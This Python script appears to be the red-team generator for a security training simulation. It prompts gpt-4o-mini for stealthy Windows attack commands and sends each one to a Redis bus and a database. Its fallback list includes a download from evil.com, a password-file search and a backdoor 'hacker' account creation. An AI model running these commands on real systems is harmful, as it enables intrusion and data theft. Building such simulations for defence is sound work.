import sys
import time
import os
from datetime import datetime
from openai import OpenAI

sys.path.append('/app/shared')
from messaging import EventBus
from database import Database

# OpenAI クライアント
client = OpenAI(api_key=os.getenv('OPENAI_API_KEY'))

def generate_attack_command():
    """OpenAI GPT-4に攻撃コマンドを生成させる"""
    
    try:
        response = client.chat.completions.create(
            model="gpt-4o-mini",  # 安価で高速なモデル
            messages=[
                {
                    "role": "system",
                    "content": "You are a penetration testing expert. Generate Windows commands for security testing."
                },
                {
                    "role": "user",
                    "content": """Generate ONE Windows PowerShell or cmd command to achieve one of these goals:
1. Search for sensitive files (PDF, Excel)
2. Find password files
3. Exfiltrate data to external server
4. Create new user account
5. Gather system information

Requirements:
- Valid PowerShell or cmd syntax
- Single line command only
- Stealthy approach
- Output ONLY the command (no explanation)
"""
                }
            ],
            max_tokens=100,
            temperature=0.9  # 高い値 = よりランダム
        )
        
        command = response.choices[0].message.content.strip()
        
        # クリーニング
        command = command.replace('\n', ' ').replace('\r', '')
        command = command.replace('```powershell', '').replace('```cmd', '').replace('```', '')
        
        print(f"✅ GPT-4 generated: {command[:60]}...")
        return command.strip()
        
    except Exception as e:
        print(f"⚠️ OpenAI API Error: {e}")
        # フォールバック
        fallback = [
            "powershell.exe Get-ChildItem C:\\ -Recurse -Filter *.pdf",
            "cmd.exe /c dir C:\\Users /s /b | findstr password",
            "powershell.exe Invoke-WebRequest http://evil.com/steal.ps1",
            "net user hacker P@ssw0rd /add",
        ]
        import random
        return random.choice(fallback)

def main():
    print("🔴 Red Team AI Starting... (Powered by GPT-4)")
    
    # Redis接続
    redis_url = os.getenv('REDIS_URL', 'redis://redis:6379')
    event_bus = EventBus(redis_url)
    
    # データベース接続
    db_url = os.getenv('DB_URL', 'postgresql://user:password@timescaledb:5432/sechack')
    db = Database(db_url)
    
    attack_number = 1
    
    print("🤖 OpenAI GPT-4 initialized! Generating dynamic attacks...")
    
    while True:
        print(f"\n💭 Asking GPT-4 to generate attack #{attack_number}...")
        command = generate_attack_command()
        
        attack = {
            'id': attack_number,
            'timestamp': datetime.now().isoformat(),
            'command': command,
            'user': 'Student_A',
        }
        
        # Redisに送信
        event_bus.send_attack(attack)
        
        # データベースに保存
        try:
            db.save_attack(attack)
            print(f"💾 Saved to database: Attack #{attack_number}")
        except Exception as e:
            print(f"⚠️ DB Error: {e}")
        
        attack_number += 1
        time.sleep(20)

if __name__ == '__main__':
    main()